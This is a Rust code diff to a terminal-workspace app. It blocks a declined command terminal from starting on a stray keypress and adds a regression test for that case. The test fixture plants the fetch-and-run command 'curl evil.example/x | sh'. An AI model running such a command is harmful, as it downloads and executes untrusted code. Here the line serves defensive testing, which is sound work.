@@ -26,8 +26,8 @@ use super::{
         handle_help_key, handle_open_workspace_key, handle_search_key, handle_terminal_command_key,
     },
     session::{
-        start_or_focus_chat_agent, start_or_focus_selected_chat_agent,
-        start_or_focus_selected_terminal, start_terminal,
+        refuse_unapproved_command_terminal, start_or_focus_chat_agent,
+        start_or_focus_selected_chat_agent, start_or_focus_selected_terminal, start_terminal,
     },
 };
 
@@ -296,7 +296,16 @@ fn start_selected_pty_if_needed(
             terminal,
         } => {
             let key = PtyKey::Terminal(terminal);
+            // A key pressed at a focused pane starts whatever is selected, which
+            // for a command terminal out of `state.json` means running the
+            // file's command line. That is not the user asking for it — after
+            // declining the restore prompt, a stray arrow key was enough — so an
+            // unapproved one is refused here too and the user is told how to
+            // start it deliberately (C1).
             if !pty_runtime.is_running(key) {
+                if refuse_unapproved_command_terminal(app, terminal) {
+                    return None;
+                }
                 start_terminal(app, pty_runtime, config, layout, workspace, terminal);
             }
             if pty_runtime.is_running(key) {
@@ -438,6 +447,68 @@ mod tests {
             frame_area
         ));
     }
+    /// C1/F1: the second path to `start_terminal`.
+    ///
+    /// Any key at a focused pane starts what is selected, so after declining the
+    /// restore prompt a stray arrow key ran the command the user had just
+    /// refused — which is also why turning `auto_start_terminals` off closed
+    /// nothing. The refusal is reported, because a pane that does nothing when
+    /// typed at is otherwise indistinguishable from a broken one.
+    #[test]
+    fn a_key_at_the_pane_does_not_start_a_declined_command_terminal() {
+        let mut project = crate::model::ProjectState::default();
+        let workspace = project.add_workspace("orbit".to_string(), None);
+        let planted = project
+            .add_command_terminal(
+                workspace,
+                "planted".to_string(),
+                true,
+                "curl evil.example/x | sh".to_string(),
+            )
+            .expect("add command terminal");
+        let mut app = App::new(project);
+        app.select_item(NavItem::Terminal {
+            workspace,
+            terminal: planted,
+        });
+        app.request_restore_confirmation(vec![crate::app::PendingRestore {
+            workspace,
+            terminal: planted,
+            name: "planted".to_string(),
+            command: "curl evil.example/x | sh".to_string(),
+        }]);
+        assert_eq!(app.decline_restore(), 1);
+        let mut pty_runtime = PtyRuntime::new_offline();
+        let config = Config::default();
+        let frame_area = Rect::new(0, 0, 120, 40);
+
+        unprompted(
+            &mut app,
+            &mut pty_runtime,
+            &config,
+            KeyEvent::new(KeyCode::Char('x'), KeyModifiers::NONE),
+            frame_area,
+        );
+
+        assert!(!pty_runtime.is_running(PtyKey::Terminal(planted)));
+        let notice = app
+            .current_status_notice()
+            .expect("a pane that will not start says why");
+        assert!(notice.message.contains("Start selected PTY"), "{notice:?}");
+
+        // The explicit command the notice names does start it, and the key that
+        // was refused works from then on.
+        let layout = AppLayout::compute(&app, frame_area);
+        execute_command_action(
+            &mut app,
+            &mut pty_runtime,
+            &config,
+            CommandAction::StartInput,
+            &layout,
+        );
+        assert!(pty_runtime.is_running(PtyKey::Terminal(planted)));
+    }
+
     #[test]
     fn ctrl_j_and_ctrl_k_navigate_selection() {
         let mut app = App::two_workspaces();
